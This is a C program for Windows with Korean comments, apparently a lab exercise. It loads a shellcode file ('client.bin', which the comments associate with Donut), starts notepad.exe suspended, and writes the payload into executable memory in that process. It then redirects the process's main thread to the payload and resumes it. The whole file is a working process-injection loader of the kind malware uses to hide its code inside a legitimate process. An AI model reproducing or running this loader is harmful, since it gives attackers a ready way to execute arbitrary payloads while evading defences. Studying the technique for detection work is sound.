#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main() {

    FILE *fp = fopen("client.bin", "rb");

    if (fp == NULL) {
        perror("fopen");
        return 1;
    }


    // 파일 끝으로 이동
    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("fseek");
        fclose(fp);
        return 1;
    }


    // hello_donut.bin 전체 파일 크기
    long size = ftell(fp);

    if (size <= 0) {
        fclose(fp);
        fprintf(stderr, "invalid file size\n");
        return 1;
    }


    // 다시 파일 처음으로 이동
    rewind(fp);


    // ============================================================
    // loader.bin 내용을 담을 현재 프로세스의 heap buffer
    // ============================================================

    unsigned char *buffer =
        (unsigned char *)malloc((size_t)size);

    if (buffer == NULL) {
        fclose(fp);
        fprintf(stderr, "malloc failed\n");
        return 1;
    }


    size_t read_size =
        fread(
            buffer,
            1,
            (size_t)size,
            fp
        );


    fclose(fp);


    if (read_size != (size_t)size) {

        free(buffer);

        fprintf(
            stderr,
            "fread failed: %zu / %ld bytes\n",
            read_size,
            size
        );

        return 1;
    }


    printf(
        "[+] loader.bin 로드 완료: %zu bytes\n",
        read_size
    );


    SIZE_T allocation_size =
        (SIZE_T)read_size;



    // ============================================================
    // 1단계: suspended 프로세스 생성
    // ============================================================

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    si.cb = sizeof(si);


    char targetPath[] = "C:\\Windows\\System32\\notepad.exe";


    printf(
        "[*] 1단계: 일시 중지 상태로 프로세스 생성\n"
    );


    if (!CreateProcessA(
            NULL,
            targetPath,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi))
    {

        printf(
            "[-] 프로세스 생성 실패. Error=%lu\n",
            GetLastError()
        );


        // [수정]
        // 앞에서 malloc한 buffer 정리
        free(buffer);

        return 1;
    }


    printf(
        "[+] 프로세스 생성 성공! (PID: %lu)\n",
        pi.dwProcessId
    );



    // =====================================================================
    // 2단계: 대상 프로세스 내부에 새로운 RW 메모리 영역 생성
    // =====================================================================

    printf(
        "[*] 2단계: 대상 프로세스에 메모리 할당\n"
    );


    void *remote_memory =
        VirtualAllocEx(

            pi.hProcess,              // 메모리를 만들 대상 프로세스

            NULL,                     // 주소는 Windows가 선택

            allocation_size,          // [수정] 실제 읽은 파일 크기

            MEM_RESERVE |
            MEM_COMMIT,               // 예약 + commit

            PAGE_EXECUTE_READWRITE           // 읽기/쓰기 데이터 영역
        );


    if (remote_memory == NULL)
    {
        printf(
            "[-] VirtualAllocEx 실패. Error=%lu\n",
            GetLastError()
        );


        free(buffer);

        TerminateProcess(
            pi.hProcess,
            0
        );

        CloseHandle(
            pi.hThread
        );

        CloseHandle(
            pi.hProcess
        );


        return 1;
    }


    printf(
        "[+] 원격 메모리 할당 성공!\n"
    );


    printf(
        "[+] Remote Address  = %p\n",
        remote_memory
    );


    printf(
        "[+] Allocation Size = %zu bytes\n",
        (size_t)allocation_size
    );


    printf(
        "[+] Protection      = PAGE_EXECUTE_READWRITE\n"
    );

    // ============================================================
    // [수정된 부분] 함수 선언이 아닌 '실제 호출'을 해야 합니다.
    // ============================================================
    SIZE_T bytesWritten = 0;
    
    printf("[*] 3단계: 할당된 원격 메모리에 버퍼 내용 쓰기\n");

    if (!WriteProcessMemory(
            pi.hProcess,      // 1. 타겟 프로세스 핸들 (CreateProcess로 얻은 핸들)
            remote_memory,    // 2. 데이터를 쓸 원격 메모리 주소 (VirtualAllocEx 반환값)
            buffer,           // 3. 로컬 버퍼 (loader.bin 내용이 담긴 힙 영역)
            allocation_size,  // 4. 쓸 데이터 크기 (읽어들인 파일 크기)
            &bytesWritten     // 5. 실제로 쓰인 바이트 수
        )) 
    {
        printf("[-] WriteProcessMemory 실패. Error=%lu\n", GetLastError());
        
        // 실패 시 자원 정리
        VirtualFreeEx(pi.hProcess, remote_memory, 0, MEM_RELEASE);
        free(buffer);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    printf("[+] 원격 메모리에 데이터 쓰기 성공! (Written: %zu bytes)\n", bytesWritten);


    printf("[*] 4단계: 스레드 문맥(Context) 가로채기\n");
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL; // 또는 CONTEXT_CONTROL 플래그만 써도 EIP/RIP 조작 가능

    if (GetThreadContext(pi.hThread, &ctx)) {
        
        // ★ 핵심 포인트: EAX/RCX가 아닌, '다음에 실행할 명령어 주소'인 EIP/RIP를 직접 덮어버림
#ifdef _WIN64
        printf("    [64비트] 기존 RIP: 0x%llX -> 변경된 RIP: 0x%p\n", ctx.Rip, remote_memory );
        ctx.Rip = (DWORD64)remote_memory ;
#else
        printf("    [32비트] 기존 EIP: 0x%lX -> 변경된 EIP: 0x%p\n", ctx.Eip, remote_memory );
        ctx.Eip = (DWORD)remote_memory ;
#endif
        // 조작된 뇌(Context)를 다시 이식
        if (SetThreadContext(pi.hThread, &ctx)) {
            printf("[+] 스레드 문맥 덮어쓰기 성공.\n");

            printf("[*] 5단계: 스레드 깨우기 (ResumeThread)\n");
            // 스레드가 깨어나자마자 우리가 할당한 공간(allocatedMemory)의 쉘코드를 강제로 실행합니다.
            ResumeThread(pi.hThread);
            printf("[+] 쉘코드 실행 시작!\n");
        } else {
            printf("[-] SetThreadContext 실패. 에러: %lu\n", GetLastError());
        }
    } else {
        printf("[-] GetThreadContext 실패. 에러: %lu\n", GetLastError());
    }



    printf(
        "[*] Enter를 누르면 메모리를 해제하고 종료합니다.\n"
    );


    getchar();



    // ============================================================
    // 3단계: 우리가 만든 원격 메모리 해제
    // ============================================================

    if (!VirtualFreeEx(
            pi.hProcess,
            remote_memory,
            0,
            MEM_RELEASE))
    {
        printf(
            "[-] VirtualFreeEx 실패. Error=%lu\n",
            GetLastError()
        );
    }
    else
    {
        printf(
            "[+] 원격 메모리 해제 완료\n"
        );
    }

    // ============================================================
    // [수정]
    // malloc()으로 만든 현재 프로세스의 buffer도 해제해야 함.
    //
    // VirtualFreeEx는 remote_memory만 해제함.
    // ============================================================

    free(buffer);

    // ============================================================
    // suspended 프로세스 종료
    // ============================================================

    TerminateProcess(
        pi.hProcess,
        0
    );

    // ============================================================
    // 프로세스 / 스레드 HANDLE 정리
    // ============================================================

    CloseHandle(
        pi.hThread
    );


    CloseHandle(
        pi.hProcess
    );


    printf(
        "[+] 실습 종료\n"
    );


    return 0;
}